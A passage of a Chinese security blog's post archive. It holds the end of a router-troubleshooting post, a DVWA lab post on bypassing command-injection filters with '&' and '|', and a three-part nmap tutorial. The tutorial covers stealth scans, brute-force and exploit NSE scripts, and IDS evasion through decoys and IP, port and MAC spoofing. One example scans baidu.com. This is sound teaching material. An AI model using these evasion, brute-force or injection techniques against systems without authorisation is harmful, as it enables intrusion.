<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392266054.png" data-fancybox="group" data-caption="1545392266054" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392266054.png" alt="1545392266054" title="1545392266054"></a></p>
<p>我们看啊，取得时候完全没问题，他已经到了PC2了，但是回来的时候挂在路由这里了哎，那我们猜测他找不到回来的路由。我们进入HQ查看路由表。</p>
<p>果然没有到PC1的路由。那么我们就要给他添加一条路由了。</p>
<p>HQ(config)#ip route 172.20.1.128 255.255.255.128 172.20.1.1</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392467629.png" data-fancybox="group" data-caption="1545392467629" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392467629.png" alt="1545392467629" title="1545392467629"></a></p>
<p>我们发现OK问题排查完成！</p>
<p>继续进行，看看发往web服务器的包问题出在哪里？</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392631437.png" data-fancybox="group" data-caption="1545392631437" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392631437.png" alt="1545392631437" title="1545392631437"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392647133.png" data-fancybox="group" data-caption="1545392647133" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392647133.png" alt="1545392647133" title="1545392647133"></a></p>
<p>我们发现这个也是过得去回不来，我们查看路由表。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392699415.png" data-fancybox="group" data-caption="1545392699415" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392699415.png" alt="1545392699415" title="1545392699415"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392804031.png" data-fancybox="group" data-caption="1545392804031" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392804031.png" alt="1545392804031" title="1545392804031"></a></p>
<p>这个路由表指有到172.20.0.0网段的路由，这里我们猜测PC2跟他通讯应该是OK的。</p>
<p>猜想正确，这里面我们简单粗暴一点，因为这个ISP路由器在外面就只有一个接口，我们直接叫他的所有包都给这个S0/0/1接口</p>
<p>ISP(config)#ip route 0.0.0.0 0.0.0.0 s0/0/1</p>
<p>ISP(config)#</p>
<p>ISP(config)#no ip route 172.20.0.0 255.255.255.0 192.168.38.254</p>
<p>ISP(config)#no ip route 192.168.2.0 255.255.255.0 Serial0/0/0</p>
<p>删除并且设定路由，这里面我们试一试看看PC1通了吗。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392950798.png" data-fancybox="group" data-caption="1545392950798" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545392950798.png" alt="1545392950798" title="1545392950798"></a></p>
<p>OK问题解决了！</p>
<p>这还是PC1,PC2,WEB服务器都能够PING通，但是这时候我们为什么进度还是94%！！！！我们查看检查说是我们Brunch还有ISP这两个路由器的静态路由配置有问题啊，这个我们是在有点····，经过我们考虑是路由设定的不严格导致的问题，我们设定严格的路由试一试！</p>
<p>Branch(config)#ip route 0.0.0.0 0.0.0.0 172.20.1.2</p>
<p>删除原先的路由，这里重新设置一下。我们发现变道97%了</p>
<p>然后我们设置ISP的路由</p>
<p>ISP(config)#ip route 172.20.0.0 255.255.254.0 192.168.38.254</p>
<p>删除原先的路由然后我们发现100%进度。完成！</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>网络故障排除</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>关于DVWA靶场的命令执行漏洞小测</title>
    <url>/2018/12/18/e5-85-b3-e4-ba-8edvwa-e9-9d-b6-e5-9c-ba-e7-9a-84-e5-91-bd-e4-bb-a4-e6-89-a7-e8-a1-8c-e6-bc-8f-e6-b4-9e-e5-b0-8f-e6-b5-8b/</url>
    <content><![CDATA[<p>命令执行漏洞</p>
<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等 ，当应用程序对其过滤不严格的时候，就会产生命令执行漏洞。从而使应用程序收到攻击。</p>
<p>exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec() 、反引号` 实际上是使用shell_exec()函数，此外还要小心mail（）函数的安全。</p>
<p>这里列举了一些常见的我们需要警惕的函数。</p>
<p>为了更加深入的理解，我们拿DVWA靶场来进行一下说明。</p>
<p>2 DVWA靶场命令执行漏洞</p>
<p>low级别</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851222103.png" data-fancybox="group" data-caption="1535851222103" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851222103.png" alt="1535851222103" title="1535851222103"></a></p>
<p>我们发现Low级别并没有对我们输入的参数做任何过滤。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851292822.png" data-fancybox="group" data-caption="1535851292822" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851292822.png" alt="1535851292822" title="1535851292822"></a></p>
<p>我们直接构造payload发现可以绕过。</p>
<p>medium级别</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851418203.png" data-fancybox="group" data-caption="1535851418203" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851418203.png" alt="1535851418203" title="1535851418203"></a></p>
<p>我们发现这里:还有&amp;&amp;被转义为 空格了</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851471188.png" data-fancybox="group" data-caption="1535851471188" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851471188.png" alt="1535851471188" title="1535851471188"></a></p>
<p>但是我们这里用一个&amp;绕过了。</p>
<p>high级别</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851510251.png" data-fancybox="group" data-caption="1535851510251" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851510251.png" alt="1535851510251" title="1535851510251"></a></p>
<p>我们发现这里转移了好多东西，我们要想办法尝试绕过。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851624866.png" data-fancybox="group" data-caption="1535851624866" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851624866.png" alt="1535851624866" title="1535851624866"></a></p>
<p>这里我们用|连到一起，使ip那里为假就会执行后面的漏洞。</p>
<p>从而实现。</p>
<p>impossible级别</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851688824.png" data-fancybox="group" data-caption="1535851688824" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1535851688824.png" alt="1535851688824" title="1535851688824"></a></p>
<p>我们发现这里对ip地址进行了严格的限制，从而限制了我们的输入。</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>dvwa</tag>
        <tag>安全之路</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具入门4-namp的使用（下）</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a84-namp-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-8b-ef-bc-89/</url>
    <content><![CDATA[<p>kali工具入门4-namp的使用（下）</p>
<h1 id="kali工具入门4-namp的使用（下）"><a href="#kali工具入门4-namp的使用（下）" class="headerlink" title="kali工具入门4-namp的使用（下）"></a>kali工具入门4-namp的使用（下）</h1><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p> 前面我们介绍了NMAP的简单使用比如说一些主机探测，版本探测，端口扫描等等，那么在实际我们进行工作的时候我们常常会有一些需求，比如说这个被墙了，或者我们需要筛选一部分内容，这个都是我们需要注意的，有的时候我们还会有自己的一些需求，这个时候我们就要用到脚本了，脚本我们在前面也介绍过，这里我们来详细的说明一下。</p>
<p> ··青花</p>
<h2 id="NMAP脚本"><a href="#NMAP脚本" class="headerlink" title="NMAP脚本"></a>NMAP脚本</h2><p> Nmap脚本使用lua编写的，lua语言是什么这里我们就不详细说明了，也属于C语言一族，这个我们一会我们会进行一个简单的介绍，我们对于脚本的说明主要在于一些功能性的脚本说明。</p>
<p> 我们先来说说如何调用NMAP脚本，前面我们说过我们利用</p>
<p>–scritp</p>
<p>这个参数我们来调用脚本。</p>
<p>我们可以在Nmap的目录里面找到我们存储着脚本的目录，我们发现这里又好多。</p>
<p>我们随便打开一个看看。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542552592877.png" data-fancybox="group" data-caption="1542552592877" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542552592877.png" alt="1542552592877" title="1542552592877"></a></p>
<p>这个就是我们探测僵尸主机的僵尸脚本。上节我们说到这个了。</p>
<p>下面我们说明一下脚本的简单分类，这个是在乌云知识库里面提取的。</p>
<pre><code>auth: 负责处理鉴权证书（绕开鉴权）的脚本

broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务

brute: 提供暴力破解方式，针对常见的应用如http/snmp等

default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力

discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等

dos: 用于进行拒绝服务攻击

exploit: 利用已知的漏洞入侵系统

external: 利用第三方的数据库或资源，例如进行whois解析

fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽

malware: 探测目标机是否感染了病毒、开启了后门等信息

safe: 此类与intrusive相反，属于安全性脚本

version: 负责增强服务与版本扫描（Version Detection）功能的脚本

vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 </code></pre><p>我们看到目录有很多脚本，这里我们也没办法都一个一个的详细介绍，这里呢我们选择一些常用的进行介绍。</p>
<h2 id="NMAP常用脚本"><a href="#NMAP常用脚本" class="headerlink" title="NMAP常用脚本"></a>NMAP常用脚本</h2><p>检测一些漏洞是否存在的脚本</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542552635751.png" data-fancybox="group" data-caption="1542552635751" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542552635751.png" alt="1542552635751" title="1542552635751"></a></p>
<p>sshv1.nse</p>
<p>这个脚本主要用于探测是否SSH使用过时的SSH1版本服务。</p>
<p>另外我们在进行信息搜集的时候常常要去爆破一些文件服务器等操作。</p>
<p>这里我们来介绍几个smtp协议的脚本。</p>
<p>smtp-brute.nse</p>
<p>这个脚本用于爆破smtp邮件的服务。</p>
<p>smtp-vuln-cve2011-1764.nse</p>
<p>检查EXIM SMTP服务器中的格式字符串漏洞</p>
<p>（版本4.70到4.75）具有域名密钥识别邮件（DKIM）支持</p>
<p>（CVE-2011-1764）。DKIM日志记录机制没有使用格式字符串</p>
<p>记录DKIM签名头字段的某些部分时的说明符。</p>
<p>一个能够发送电子邮件的远程攻击者可以利用这个漏洞。</p>
<p>并使用EXM守护进程的特权执行任意代码。</p>
<p>dns-zone-transfer.nse</p>
<p>这个脚本用于检查目标DNS是否允许传送，如果允许，你懂的。</p>
<p>mysql-empty-password.nse</p>
<p>这个用于扫描mysql，root的空密码。</p>
<p>mysql-brute.nse  </p>
<p>Mysql弱口令爆破</p>
<p> 像这个样的好多脚本，我们就不一一介绍了，我们可以在网上查阅一些文章，或者自己慢慢探索，限于篇幅，我们就不一一详细介绍了。</p>
<h2 id="NMAP脚本分析与简单编写"><a href="#NMAP脚本分析与简单编写" class="headerlink" title="NMAP脚本分析与简单编写"></a>NMAP脚本分析与简单编写</h2><p> 首先呢，我们要找到脚本的文件。</p>
<pre><code>/usr/share/nmap/scripts </code></pre><p>它们都在这个文件夹里面。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542508970503.png" data-fancybox="group" data-caption="1542508970503" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542508970503.png" alt="1542508970503" title="1542508970503"></a></p>
<p>打开脚本</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542509896232.png" data-fancybox="group" data-caption="1542509896232" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542509896232.png" alt="1542509896232" title="1542509896232"></a></p>
<p>我们看到这里面我们打开这里就是描述信息，里面描述了脚本的功能还有作者信息。</p>
<p>继续向下看</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542510025639.png" data-fancybox="group" data-caption="1542510025639" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542510025639.png" alt="1542510025639" title="1542510025639"></a></p>
<p>这里的prerule还有action我看看到这个就是核心了。这里面定义了好多规则。</p>
<p>最核心的是ACTION，我们看这里面调用了UDP套接字，掩码，端口等信息，下面是规则。这个使用LUA编写的NSE脚本。</p>
<p>那么下面我们来说明一下，如何编写属于我们的NSE吧！</p>
<p>我们先利用Lua编写portrule这个是端口的规则。action这里定义的是函数规则。</p>
<p>比如说，这里我们弄一个http端口80的开放情况。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542513841368.png" data-fancybox="group" data-caption="1542513841368" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542513841368.png" alt="1542513841368" title="1542513841368"></a></p>
<p>我们简单的编写一些过滤规则。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542513891649.png" data-fancybox="group" data-caption="1542513891649" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542513891649.png" alt="1542513891649" title="1542513891649"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542513907531.png" data-fancybox="group" data-caption="1542513907531" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1542513907531.png" alt="1542513907531" title="1542513907531"></a></p>
<p>我们看到，我们的脚本成功运行了。</p>
<p>我们也可以利用lua以及调用一些nmap的规则编写脚本，完成我们更多的一些骚操作。</p>
<p><a href="https://www.cnblogs.com/liun1994/p/7041531.html" target="_blank" rel="noopener">参考文章</a></p>
<h2 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h2><p> 由于篇幅有限，对于更多的操作，我们没有办法一一列举，本文只能举一个简单的例子进行说明，给大家一个简单的方向，后续学习还是要靠大家自己的，nmap是我们渗透测试的一大利器，利用好了，可以叫我们事半功倍！</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>网络探测</category>
      </categories>
      <tags>
        <tag>网络探测</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具入门4-nmap的使用（中）</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a84-nmap-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-ad-ef-bc-89/</url>
    <content><![CDATA[<p>kali工具入门4-nmap的使用（中）</p>
<h1 id="kali工具入门4-nmap的使用（中）"><a href="#kali工具入门4-nmap的使用（中）" class="headerlink" title="kali工具入门4-nmap的使用（中）"></a>kali工具入门4-nmap的使用（中）</h1><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p> 前面我们简单的介绍了nmap的一些参数，以及端口的状态信息，后面也说了一下主机探测和端口扫描，在本节我们将会继续向下深入一些内容。</p>
<p> –青花</p>
<h2 id="服务以及版本探测"><a href="#服务以及版本探测" class="headerlink" title="服务以及版本探测"></a>服务以及版本探测</h2><p> 在渗透测试过程中，我们常常也需要了解目标运行的什么操作系统，并且运行着什么服务，这对于我们进一步利用测试有着很大的作用。</p>
<p>一般来说我们可以用</p>
<p>-sV 参数来查看服务版本</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213141169.png" data-fancybox="group" data-caption="1541213141169" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213141169.png" alt="1541213141169" title="1541213141169"></a></p>
<p>这里我们队一个主机上运行的服务进行探测，这里我们看到http,以及https，容器是nginx。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213247060.png" data-fancybox="group" data-caption="1541213247060" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213247060.png" alt="1541213247060" title="1541213247060"></a></p>
<p>这里也给我们列举了一些更加详细的扫描方式。</p>
<p>这里要说的是扫描强度在1-9之间，等级越高扫描的越详细，并且费的时间越长。默认等级为7。</p>
<p>除此之外，我们可以用-O来查看系统版本信息。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213456619.png" data-fancybox="group" data-caption="1541213456619" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213456619.png" alt="1541213456619" title="1541213456619"></a></p>
<p>这里我们探测出来一些系统的信息。</p>
<p>除此之外我们另外介绍一些参数，诸如说我们可以利用-T来对速度进行控制。</p>
<p>-T 速度可以选在0-5之间</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213808587.png" data-fancybox="group" data-caption="1541213808587" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213808587.png" alt="1541213808587" title="1541213808587"></a></p>
<p>这里是T3的</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213842210.png" data-fancybox="group" data-caption="1541213842210" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541213842210.png" alt="1541213842210" title="1541213842210"></a></p>
<p>这里是T5的</p>
<p>可以看出来速度还是有差异的。</p>
<h2 id="输出文件"><a href="#输出文件" class="headerlink" title="输出文件"></a>输出文件</h2><p> 对于nmap的扫描结果我们是可以输出的。这里我们来介绍一下</p>
<p>对于Nmap来说他有三种输出格式（grep，标准，还有xml）</p>
<p>我们可以利用三种参数来输出</p>
<p>-oX xml输出</p>
<p>-oG grep输出</p>
<p>-oN 标准输出</p>
<p>另外我们可以指定-oA输出三种格式的内容。</p>
<p>-v 可以指定详细的程度，最多可以到3个v</p>
<p>-v -vv -vvv -v3</p>
<p>–reason 可以用来显示详细判断内容</p>
<p>–packet-trace可以用来追踪发送数据包，报文等。</p>
<p>–iflist 用于列举路由</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541214511290.png" data-fancybox="group" data-caption="1541214511290" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1541214511290.png" alt="1541214511290" title="1541214511290"></a></p>
<p>比如说我们这里探测并且输出了这些内容。</p>
<p>另外可以用-6 来指定ipv6扫描、</p>
<h2 id="NMAP防火墙，IDS躲避哄骗"><a href="#NMAP防火墙，IDS躲避哄骗" class="headerlink" title="NMAP防火墙，IDS躲避哄骗"></a>NMAP防火墙，IDS躲避哄骗</h2><p> 在我们进行探测的时候，我们常常碰到被墙了，或者被IDS给拦下来了，道高一尺，魔高一丈，那么我们就要想办法绕过去。这里我们就来介绍一下如何绕过。</p>
<p>-f 该参数给数据进行分片，其思路是将TCP头分段在几个包中，使得包过滤器、 IDS以及其它工具的检测更加困难。</p>
<p>-D 伪造IP，在伪造的IP中夹杂着我们的真实IP，然后叫被扫描主机分不清哪一个是诱饵，哪一个是真实的主机。使用逗号分隔每个诱饵主机，也可用自己的真实IP作为诱饵，这时可使用 ME选项说明。如果在第6个位置或 更后的位置使用ME选项，一些常用 端口扫描检测器(如Solar Designer’s excellent scanlogd)就不会报告 这个真实IP。如果不使用ME选项，Nmap 将真实IP放在一个随机的位置。</p>
<p>-S 源地址欺骗，这里我们可以伪造数据包发送的源地址</p>
<p>–source-port 或 -g（源端口欺骗）</p>
<p>伪造端口进行发包欺骗，往往有许多防火墙的过滤规则都有很多弱点，往往认为来自某一个端口的内容是安全的，从而带来安全隐患。</p>
<p>–proxies url1,url2 使用http代理</p>
<p>–data-length</p>
<p>发送报文时，附加随机数据，我们可以在后面这样</p>
<p>–data-string附加ascii字符</p>
<p>正常情况下，Nmap发送最少的报文，只含一个包头。因此TCP包通常 是40字节，ICMP ECHO请求只有28字节。这个选项告诉Nmap在发送的报文上 附加指定数量的随机字节。操作系统检测(-O)包不受影响， 但大部分ping和端口扫描包受影响，这会使处理变慢，但对扫描的影响较小。</p>
<p>–ttl</p>
<p>这个选项用于设定ipv4包生存时间的值。</p>
<p>–spoof-mac 伪造mac地址</p>
<p>要求Nmap在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 –send-eth选项，以保证Nmap真正发送以太网包。MAC地址有几 种格式。如果简单地使用字符串“0”，Nmap选择一个完全随机的MAC 地址。如果给定的字符品是一个16进制偶数(使用:分隔)，Nmap将使用这个MAC地址。 如果是小于12的16进制数字，Nmap会随机填充剩下的6个字节。如果参数不是0或16进 制字符串，Nmap将通过nmap-mac-prefixes查找 厂商的名称(大小写区分)，如果找到匹配，Nmap将使用厂商的OUI(3字节前缀)，然后 随机填充剩余的3个节字。正确的–spoof-mac参数有， Apple， 0，01:02:03:04:05:06， deadbeefcafe，0020F2， 和Cisco.</p>
<h2 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h2><p> 本节我们继续又深入介绍了一些NMAP的功能，服务系统版本探测，另外也介绍了一些对于防火前IDS的一些哄骗绕过参数，下节我们将继续介绍NMAP的一个很重要的东西，那就是NMAP的NES脚本。</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>网络探测</category>
      </categories>
      <tags>
        <tag>网络探测</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具入门4-Namp的使用（上）</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a84-namp-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-8a-ef-bc-89/</url>
    <content><![CDATA[<p>kali工具入门4-Namp的使用</p>
<h1 id="kali工具入门4-Namp的使用（上）"><a href="#kali工具入门4-Namp的使用（上）" class="headerlink" title="kali工具入门4-Namp的使用（上）"></a>kali工具入门4-Namp的使用（上）</h1><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p> 前面我们说到了wireshark的简单使用，在渗透测试或者我们在进行漏洞挖掘的时候常常会用到nmap来进行端口探测，信息收集等等。这个也是我们必不可少的一款神器。那么本节我们就来介绍一下NAMP的使用，除此之外呢，这个工具比较流行，我们就尽量说的细一点。慢慢的探索。</p>
<p> –青花</p>
<h2 id="Nmap的基本语法"><a href="#Nmap的基本语法" class="headerlink" title="Nmap的基本语法"></a>Nmap的基本语法</h2><p>我们Nmap的基本常规扫描是</p>
<p>Nmap 选项 ip或者主机，这里我们要注意的事Nmap默认扫描的是1000个常用端口哦，如果想要扫描其他的我们需要另外指定。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540604671323.png" data-fancybox="group" data-caption="1540604671323" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540604671323.png" alt="1540604671323" title="1540604671323"></a></p>
<p>比如说我们Nmap -A baidu.com（-A 的意思是综合扫描）</p>
<p>我们扫描百度</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540604796544.png" data-fancybox="group" data-caption="1540604796544" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540604796544.png" alt="1540604796544" title="1540604796544"></a></p>
<p>我们看到这里扫描出了百度开放的一些端口信息以及主机信息。</p>
<p>我们可以扫描一个网段。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540604840517.png" data-fancybox="group" data-caption="1540604840517" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540604840517.png" alt="1540604840517" title="1540604840517"></a></p>
<p>这里我们扫描结束之后我们看到这里已经扫描完成了，不过没有结果。因为这个网段里面没有主机。</p>
<p>接下来我们继续向下测试</p>
<p>那么我们扫描一个网段中，我们已知有一台主机存在，但是我们已经了解了它的信息，我们不想扫描它。我们可以用</p>
<p>–exclude</p>
<p>我们kali的虚拟机地址为192.168.242.129 我们扫描C段。想扫描其他开放主机的信息，但是这个kali我不想扫，我们应该怎么做呢？</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540605973462.png" data-fancybox="group" data-caption="1540383792535" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540605973462.png" alt="1540383792535" title="1540383792535"></a></p>
<p>我们不扫描129.</p>
<h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><p>另外在渗透测试中，我们常常要用到扫描一些C段之类的东西，比如说我们需要发现C段内的一些主机。这时候我们就要利用主机发现的命令去发现主机。</p>
<p>这里我们来说明一下一些基本的命令</p>
<pre><code>NMAP

-sP   ping 扫描
-PO   无ping扫描
-PS   TCP+SYN ping 扫描
-PA      TCP+ACK Ping 扫描
-PU   UDP  ping扫描
-PY      SCTP ping扫描
-n    禁止DNS反向解析
PR      ARP ping扫描
--reason　显示端口处于带状态的原因
-F  快速扫描</code></pre><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540605158325.png" data-fancybox="group" data-caption="1540467543839" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540605158325.png" alt="1540467543839" title="1540467543839"></a></p>
<p>比如说我们这里扫描，这里没有发现主机。</p>
<h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><p>这里面我们看到这里有state这么一栏，这里是说明了端口状态我们来介绍一下。</p>
<p>OPEN 表示端口开放状态</p>
<p>Closed 表示端口关闭状态</p>
<p>Filtered 表示数据包到达了，但是没有返回，但是被墙了或者过滤了</p>
<p>UnFiltered 表示数据包没有到达，不能知晓主机状态</p>
<p>Open|filtered 这个无法识别端口是开放还是Filtered状态，常常出现在，udp，ip protocol ，TCP null，fin，和xmas扫描中。</p>
<p>Closed|filtered 这种状态主要出现在nmap无法区分端口处于closed还是filtered时。此状态只会出现在IP ID idle scan扫描中。</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>在进行渗透测试的过程中，我们常常要探测目标主机开放端口，已确定运行其上面的一些服务，以便我们利用。</p>
<p>至于常见端口啥的我就不一一的说了，这个我们自己去了解了。</p>
<p>什么Mysql3306啊，远程桌面3389的，http80啊。</p>
<p>老生常谈，说说参数。</p>
<pre><code>-sS     SYN扫描，秘密扫描的一种，不会被记录，基于三次握手但是不建立最后的连接，需要root权限
-sU        使用UDP扫描
-sP        对端口进行icmp扫描，说白了Ping扫描
-sT        TCP扫描，基于TCP三次握手的扫描，速度快，也比较准就是容易被拦下来或者被墙
-sA        ACK扫描
-sN        TCP头什么都不设置
-sF        只设置TCP的FIN标志位，跟sS效果差不多，但是比它快
-sX        Xmas扫描
--scanflags  自定义TCP扫描包
-p         指定端口
-sI        idle扫描，僵尸主机扫描</code></pre><p>前面的几项鉴于也没有什么特殊性，我就不详细的说明了，对于下面的我查了查资料，也说说自己的理解。</p>
<p>我们先来举一个-sS的例子，这个是什么原理呢，我们看张图</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540605478757.png" data-fancybox="group" data-caption="1540605478757" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540605478757.png" alt="1540605478757" title="1540605478757"></a></p>
<p>这张图是我们-sT扫描的一次完整过程，那么sS是什么原理呢，这里我们看其实我们想要看一个端口开没开放，我们看在TCP三次握手（PS：这个我在上次wireshark的时候有说，忘了自行补课。）的过程中我们只需要前两步就可以完成了。</p>
<p>就是在ACK这里的时候，我们前面说过可能有洪范攻击。但是在三次握手的第二步中，我们就可以通过返回的内容判断是否开放端口了。这种不会建立连接，很隐蔽，也不会被系统日志记录下来。</p>
<p>比如这里我们用sS扫描出来的结果。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606496317.png" data-fancybox="group" data-caption="1540606496317" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606496317.png" alt="1540606496317" title="1540606496317"></a></p>
<p>sN sF sX</p>
<p>这三个探测都比较隐蔽，比syn还要隐蔽，他们设置的标志位是不同的，但是也都能够起到扫描的效果。</p>
<p>这里我们就来拿sF来举个栗子。</p>
<p>输入nmap -sF 然后指定主机扫描，这里就是把TCP的FIN标志位给只换了。FIN是表示连接关闭的一个标志位。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606656590.png" data-fancybox="group" data-caption="1540526618315" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606656590.png" alt="1540526618315" title="1540526618315"></a></p>
